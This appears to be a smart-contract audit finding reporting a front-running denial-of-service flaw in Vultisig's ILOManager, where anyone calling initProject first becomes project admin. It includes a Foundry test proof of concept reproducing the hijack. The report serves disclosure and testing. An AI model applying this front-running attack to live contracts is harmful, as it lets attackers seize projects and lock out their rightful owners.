# Vulnerability details

## Impact
DoS on the ILOManager ILOPool creation process

## Proof of Concept

The [initProject](https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOManager.sol#L57) function can be called by anyone, this is its expected behavior. The _cacheProject is then called by this function to store all information related to the project. The problem with this function is that it always [reverts](https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOManager.sol#L133-L134) if a project has already initialized (liquidity pool registered). This also sets the [admin](https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOManager.sol#L138) of the project as the caller, so it's important for the admin to call the function with his address to configure the ILOManager settings.

An attacker could easily call this function just before any other address calls it. This will avoid that user from becoming the admin of its project. Not only that, but the attacker will be the only one able to initialize a new ILOPool with that uniswap pool (see [initILOPool](https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOManager.sol#L72) and [onlyProjectAdmin](https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOManager.sol#L51-L54). The attacker only spends gas since he only needs to listen to the function call in the mempool.

This cannot be avoided even if the project owner initializes the pool in another tx. Since [_initUniV3PoolIfNecessary](https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOManager.sol#L109) doesnt revert if the pool was already created.

POC: paste this function for testing below [these](https://github.com/code-423n4/2024-06-vultisig/blob/main/test/ILOManager.t.sol#L23) lines.

```solidity
    function testDOSonInitProject() external {
        vm.prank(DUMMY_ADDRESS);
        address uniV3Pool = iloManager.initProject(
            IILOManager.InitProjectParams({
                saleToken: mockProject().saleToken,
                raiseToken: mockProject().raiseToken,
                fee: 10000,
                initialPoolPriceX96: mockProject().initialPoolPriceX96 + 1,
                launchTime: mockProject().launchTime
            })
        );

        IILOManager.InitPoolParams memory params = _getInitPoolParams();
        //as long as project hasnt been initialized with this pool
        //any pool can be used
        params.uniV3Pool = uniV3Pool;

        IILOPool iloPool = IILOPool(_initPool(DUMMY_ADDRESS, params));

        assertEq(iloManager.project(uniV3Pool).admin, DUMMY_ADDRESS);

        // owner can no longer create project
        vm.prank(PROJECT_OWNER);
        vm.expectRevert(bytes("RE"));
        iloManager.initProject(
            IILOManager.InitProjectParams({
                saleToken: mockProject().saleToken,
                raiseToken: mockProject().raiseToken,
                fee: 10000,
                initialPoolPriceX96: mockProject().initialPoolPriceX96 + 1,
                launchTime: mockProject().launchTime
            })
        );
    }
```
